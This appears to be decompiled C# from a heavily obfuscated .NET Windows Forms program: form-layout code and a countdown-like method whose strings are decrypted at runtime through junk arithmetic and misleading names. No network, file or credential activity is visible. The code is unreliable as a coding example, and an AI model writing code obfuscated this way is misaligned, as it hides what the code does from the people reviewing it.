		array350[Convert.ToInt32("87d5", 16) ^ 0x87D5] = Convert.ToInt32(char.ToString('1') + "773", 16);
		array350[1] = _003CModule_003E.ActivityOptions[51];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_356, array350);
		int num569 = Convert.ToInt32(string_356, _003CModule_003E.LoadVector128[Convert.ToInt32("2", 8) << get_CurrencyGroupSeparator]);
		string string_357 = string.Concat(char.ToString((char)Convert.ToInt32("58f5", 16)), char.ToString('壳'), char.ToString('壳') + "壵壶");
		object[] array351 = new object[6];
		array351[Convert.ToInt32("0", 16)] = 15835;
		array351[(nint)((Array)(object)"\u033a").LongLength] = checked(Convert.ToInt32("2301543", 8) - 623358);
		array351[415705 + array2[310]] = (byte)(0 % Convert.ToInt32("11111111111110100100010010001010", 2)) != 0;
		array351[array2[4]] = string.Concat(char.ToString((char)get_IsVirtual), char.ToString('\u0013'), char.ToString('\u0011') + "\a\r");
		array351[4] = string.Concat(char.ToString('ʓ'), char.ToString('\u0086') + "\u0017\u0006");
		array351[(uint)array[7]] = '።';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_357, array351);
		int num570 = ((Convert.ToInt32(string_357, Convert.ToInt32("8", 16)) <= 45748) ? StructureToPtr : (299748 - Convert.ToInt32("4503316270", 8) / 1404));
		array346[num569] = num570;
		string string_358 = char.ToString((char)Convert.ToInt32("154707", 8)) + "\ud9c6\ud9c7";
		object[] array352 = new object[3];
		array352[0] = 29898;
		array352[Convert.ToInt32("1", 16)] = string.Concat(char.ToString((char)Convert.ToInt32("101100100001", 2)), char.ToString('Ș') + "1\0\u0002");
		array352[0 | Convert.ToInt32("2", 8)] = string.Concat(char.ToString((char)InvalidProgramException), char.ToString('෬') + "ձ⪖");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_358, array352);
		array346[(uint)array4[Convert.ToInt32(string_358, 2)]] = (byte)_003CModule_003E.LoadVector128[_003CModule_003E.get_PositiveSign[Convert.ToInt32("43", 16)] - -976848] != 0;
		_003CModule_003E.GetMaxByteCount(ref string_351, array346);
		((Control)this).set_Name(string_351);
		((Form)this).set_StartPosition((FormStartPosition)(array6[4] % (nint)(((array2[311] ^ -416631) > Marshal.SizeOf(typeof(ComponentSize))) ? (-246961) : ((Array)(object)"\u0323\u036e").LongLength)));
		string string_359 = char.ToString('衯') + char.ToString('衢') + "衠蠲";
		object[] obj52 = new object[6] { 431, null, null, null, null, null };
		int num571 = Convert.ToInt32("1", 2);
		obj52[num571] = 'ဇ';
		obj52[2] = '᪕';
		obj52[(nint)((Array)(object)(char.ToString('.') + "\u0303\u031f")).LongLength] = 'Ž';
		obj52[Marshal.SizeOf(typeof(IsValidText))] = (byte)Convert.ToInt32("0", 16) != 0;
		int num572 = _003CModule_003E.get_PositiveSign[2];
		int num573 = default(int);
		switch (checked(IsValidUnicodeScalar + 925536))
		{
		case 0:
			num573 = SYS_WIN64;
			break;
		case 1:
			num573 = 23182;
			break;
		case 2:
			num573 = _003CModule_003E.ActivityOptions[183];
			break;
		}
		obj52[num572] = (char)num573;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_359, obj52);
		string text261 = char.ToString((char)Convert.ToInt32(string_359, Convert.ToInt32("10", 16)));
		string text262 = char.ToString((char)IEnumVARIANT);
		string string_360 = char.ToString('ጙ') + "ጆፚ";
		object[] array353 = new object[(uint)array[6]];
		int num574 = _003CModule_003E.get_PositiveSign[200];
		array353[0] = (char)num574;
		array353[sizeof(byte)] = 3973;
		array353[2] = Marshal.SizeOf(typeof(TypeCount));
		array353[endAction] = 14378;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_360, array353);
		string string_361 = string.Concat(text261, text262 + string_360);
		int num575 = ~(-589272 + Convert.ToInt32("10001111110111010011", 2));
		char c104 = (char)(510 >> (int)array[8]);
		object[] array354 = new object[num575 | (int)c104];
		int[] loadVector4 = _003CModule_003E.LoadVector128;
		int num576 = Convert.ToInt32("0", 2);
		int num577 = loadVector4[num576] << 0 / (Convert.ToInt32("100010010001011000010111", 2) * 2);
		int num578 = -15887 + Convert.ToInt32("11111" + "000001111", 2);
		string string_362 = string.Concat(char.ToString((char)Convert.ToInt32("1001000101011111", 2)), char.ToString('酟'), char.ToString('酟') + "酟酟酚鄌酟");
		object[] array355 = new object[Marshal.SizeOf(typeof(CharSetMask))];
		array355[0] = checked(-399878 + Convert.ToInt32("695b4", 16));
		array355[1] = _003CModule_003E.ActivityOptions[52];
		array355[2] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_362, array355);
		array354[num577] = (byte)(num578 / Convert.ToInt32(string_362, 16)) != 0;
		int num579 = _003CModule_003E.KeyValuePair__2[60] ^ -174084;
		int num581 = default(int);
		switch (_003CModule_003E.ActivityOptions[1] * -948789 % _003CModule_003E.ActivityOptions[(uint)array[85]])
		{
		case 0:
			num581 = array2[313];
			break;
		case 1:
		{
			int num580 = ((array2[314] == _003CModule_003E.KeyValuePair__2[213]) ? (-387989) : 218343);
			num581 = num580;
			break;
		}
		}
		int num583;
		if (((num579 > num581) ? 1 : 0) == SAKA)
		{
			int num582 = ((_003CModule_003E.ActivityOptions[54] >= -371969 * array2[95]) ? 189363 : Convert.ToInt32("37" + char.ToString('7') + "76363266", Convert.ToInt32("10", 8)));
			num583 = num582;
		}
		else
		{
			num583 = 1 & checked(_003CModule_003E.KeyValuePair__2[214] + -672653);
		}
		int num584 = num583;
		string string_363 = string.Concat(char.ToString('\u1aee'), char.ToString('\u1aef'), char.ToString('\u1aee') + char.ToString('\u1aee') + "\u1aef\u1aef\u1aef\u1aee");
		object[] array356 = new object[3];
		array356[array2[(uint)array[3]]] = (char)Convert.ToInt32(char.ToString('c') + "87", 16);
		array356[1] = (char)OrderedNonSignaling;
		char stream4 = (char)Stream;
		array356[(int)stream4] = (byte)((uint)Convert.ToInt32("1", 16) & (false ? 1u : 0u)) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_363, array356);
		int num585 = ((Convert.ToInt32(string_363, 2) != _003CModule_003E.LoadVector128[30]) ? Marshal.SizeOf(typeof(UnorderedNotGreaterThanOrEqualSignaling)) : (Convert.ToInt32("ff" + "f758d8", 16) % -226832));
		array354[num584] = (char)num585;
		char c105 = (char)(array2[90] + 301675);
		array354[(int)c105] = checked(-2815338 * (Block64 & Convert.ToInt32("37777776410", 8))) / (TStateMachine / Convert.ToInt32("10" + "10" + "10011100", 2));
		int num586 = ((16911 >= array2[315]) ? (-532666) : 26773164);
		int num587 = _003CModule_003E.KeyValuePair__2[108];
		checked
		{
			int num588 = unchecked(num586 / num587) - (0x26D80 | unchecked(68080 % Convert.ToInt32("110101001100000", 2)));
			int num589 = array[69];
			int num590 = num589 & DynamicallyAccessedMembersAttribute;
			int num591 = -734586 ^ Tuple__7;
			int num592 = default(int);
			switch (Convert.ToInt32("11111111111111101111110111010011", 2))
			{
			case -66094:
				num592 = Convert.ToInt32("3347446", 8);
				break;
			case -66093:
				num592 = 568137;
				break;
			}
			array354[num588] = num590 | (num591 + num592);
			int num593 = ((Convert.ToInt32(char.ToString('4') + char.ToString('1') + "212", 8) == ~Convert.ToInt32("1010010111101101", 2)) ? array2[91] : ((Array)(object)(char.ToString('\u0312') + "\u034f\u0336\u036e")).Length);
			char c106 = unchecked((char)num593);
			array354[unchecked((int)c106)] = 946887 - unchecked((216407123 >> Convert.ToInt32("1001", 2)) - -505819);
			_003CModule_003E.GetMaxByteCount(ref string_361, array354);
			((Control)this).set_Text(string_361);
			((Form)this).add_Load((System.EventHandler)get_HResult);
		}
		((Control)panel_0).ResumeLayout((byte)(checked(unchecked(_003CModule_003E.KeyValuePair__2[215] * -25) - Marshal.SizeOf(typeof(RemoveEventHandler))) / ReciprocalScalar) != 0);
		((Control)panel_0).PerformLayout();
		Panel marvinSeed4 = MarvinSeed;
		int num594 = default(int);
		switch (checked(-568583 + _003CModule_003E.get_PositiveSign[68]))
		{
		case 0:
			num594 = array2[1];
			break;
		}
		int num595 = num594;
		int num596 = default(int);
		switch (0 / Convert.ToInt32("11111111111111111111110011110011", 2))
		{
		case 0:
			num596 = -451733;
			break;
		case 1:
			num596 = -804033;
			break;
		}
		((Control)marvinSeed4).ResumeLayout((byte)checked(num595 * (num596 + array2[array2[119]])) != 0);
		((Control)MarvinSeed).PerformLayout();
		int num597 = -1368129524 | Convert.ToInt32("17172022431", 8);
		int num598 = ((Convert.ToInt32("ffff6f8b", 16) != -98423) ? 3 : (-569846));
		((Control)this).ResumeLayout((byte)checked(0 * (num597 * num598)) != 0);
		((Control)this).PerformLayout();
	}

	[CompilerGenerated]
	private unsafe void Pop0()
	{
		char[] array = new char[4] { 'Ю', 'ᥘ', '\u0002', '圧' };
		int[] array2 = new int[11]
		{
			2, 0, 4, 23, -569461, 3256, 1, -15737, 22382, 589888,
			19582
		};
		int[] array3 = new int[3];
		array3[0] = _003CModule_003E.ActivityOptions[2];
		array3[get_CurrencyGroupSeparator] = Convert.ToInt32("1111111011101111111001101", 2) & 0x1DDF9AD;
		array3[2] = 12181;
		int[] array4 = array3;
		if (Impersonation < sizeof(byte))
		{
			Impersonation = CompareScalarUnorderedNotEqual;
			if (TryReadUInt16LittleEndian == checked(-361929 + get_Ticks) + -72105)
			{
				TryReadUInt16LittleEndian = array4[_003CModule_003E.ActivityOptions[2]] >> 19;
				if ((nuint)Reserved2 > (nuint)((Array)(object)string.Empty).LongLength)
				{
					int reserved = Reserved2;
					int num = ((Convert.ToInt32("11110111100101", 2) >= Convert.ToInt32("d2c2c", 16)) ? Convert.ToInt32("37774146611", 8) : 887561);
					int num2 = Convert.ToInt32("ffffffff", 16);
					Reserved2 = reserved - checked(num * num2 + get_VersionCompatibility);
				}
			}
			else
			{
				int tryReadUInt16LittleEndian = TryReadUInt16LittleEndian;
				string string_ = string.Concat(char.ToString('櫙'), char.ToString('櫛') + char.ToString('櫟') + "檌檋");
				object[] array5 = new object[2];
				array5[0] = Convert.ToInt32(char.ToString('5') + "7060", 8);
				array5[Convert.ToInt32("1", 2)] = array2[_003CModule_003E.get_PositiveSign[2]];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_, array5);
				string value = string_;
				char c = (char)Marshal.SizeOf(typeof(PrepareDelegate));
				TryReadUInt16LittleEndian = tryReadUInt16LittleEndian - (Convert.ToInt32(value, c) >> checked(array2[2] * (array2[7] + Marshal.SizeOf(typeof(CalendricalCalculationsHelper)))));
			}
		}
		else
		{
			int impersonation = Impersonation;
			char c2 = (char)Marshal.SizeOf(typeof(IsTvOS));
			Impersonation = impersonation - (int)c2;
		}
		if (Impersonation != 0 || TryReadUInt16LittleEndian != 0 || Reserved2 != checked(Convert.ToInt32(char.ToString('3') + "347051", 8) + System_002EBuffers_002EBinary) % _003CModule_003E.CalendarType[array2[3]])
		{
		}
		Label compressedStack = CompressedStack;
		string text = char.ToString((char)_003CModule_003E.ActivityOptions[55]);
		string text2 = char.ToString((char)(Convert.ToInt32("7ca0", 16) & '佃'));
		string string_2 = "⺭⻪";
		object[] obj = new object[5] { 1912, null, null, null, null };
		char c3 = (char)sizeof(sbyte);
		obj[(uint)c3] = Convert.ToInt32("1001000100101101", 2) % 14866;
		obj[(nint)((Array)(object)"\u033d\u0318").LongLength] = char.ToString('ᔝ') + char.ToString('U') + "\n*";
		obj[endAction] = (byte)((Convert.ToInt32("fffedadf", 16) <= -420041) ? Convert.ToInt32("6d75f", 16) : ((Array)(object)string.Empty).LongLength) != 0;
		obj[4] = 10425;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_2, obj);
		string text3 = text + text2 + string_2;
		string text4 = char.ToString('䱋');
		string text5 = char.ToString((char)Marshal.SizeOf(typeof(WaitOne)));
		string string_3 = string.Concat(char.ToString('\udbcd'), char.ToString('\udb8a') + "\udbcb\udb82\udbcd");
		object[] obj2 = new object[5]
		{
			'\u0334',
			array[1],
			null,
			null,
			null
		};
		char c4 = (char)((Array)(object)"\u0344\u0316").Length;
		obj2[(int)c4] = "व(";
		obj2[3] = "ഉ扼";
		obj2[4] = 530;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_3, obj2);
		string string_4 = string.Concat(text3, text4 + text5 + string_3);
		object[] array6 = new object[(nint)((Array)(object)"\u032e").LongLength * (nint)((Array)(object)"\u035c").LongLength << (1 & (array2[8] + -22381))];
		array6[0] = (char)Num;
		array6[array4[~GetDllEntry]] = (int)((uint)array[0] << (checked(EndsWith + -392392) ^ (array2[9] | 0x6070)));
		_003CModule_003E.GetMaxByteCount(ref string_4, array6);
		string format = string_4;
		string arg = Reserved2.ToString().PadLeft(checked(81510449 + Convert.ToInt32("1111111" + "111" + "1101011100001110010001", array[2]) >> ((-59111 < Marshal.SizeOf(typeof(T12)) + PoolExhausted) ? 25 : 369966)), (char)((Marshal.SizeOf(typeof(hashCode)) != array4[array2[0]]) ? ReadTimeout : '0'));
		string text6 = TryReadUInt16LittleEndian.ToString();
		string string_5 = string.Concat(char.ToString('\ude02') + "\ude02\ude02\ude02", char.ToString('\ude02') + char.ToString('\ude02') + "\ude02\ude02\ude02", "\ude02\ude02\ude02\ude02\ude02\ude02\ude02\ude03\ude03\ude03" + "\ude02\ude03\ude02\ude03\ude02\ude03\ude02\ude02\ude02\ude02\ude03\ude02\ude03");
		object[] array7 = new object[4];
		array7[0] = 48473;
		array7[get_CurrencyGroupSeparator] = char.ToString('\u08f0') + "ـവ";
		array7[2] = RunSynchronously;
		array7[Convert.ToInt32("3", 8)] = (byte)array2[array2[6]] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array7);
		int num3 = Convert.ToInt32(string_5, 2);
		int num4 = Convert.ToInt32("ff" + "ff1578", 16);
		int totalWidth = num3 - num4;
		int paddingChar = checked(Convert.ToInt32("6b8bf14c", 16) + -652076) / 37576694;
		string arg2 = text6.PadLeft(totalWidth, (char)paddingChar);
		string text7 = Impersonation.ToString();
		string string_6 = string.Concat(char.ToString(array[3]), "圦圧" + "圦圦圦圧圧圦圧圦圧圧圧圦圧圦圦圧圧");
		object[] array8 = new object[2];
		int num5 = array2[10];
		array8[0] = num5;
		array8[1] = 'ઘ';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array8);
		((Control)compressedStack).set_Text(string.Format(format, arg, arg2, text7.PadLeft(checked(Convert.ToInt32(string_6, ((Array)(object)"\u0338.").Length) + -669137), (char)checked(541744 - ((Convert.ToInt32(char.ToString('3') + "7777732077", 8) <= 27813) ? Marshal.SizeOf(typeof(resourceSearchPathsList)) : 973945)))));
	}
}
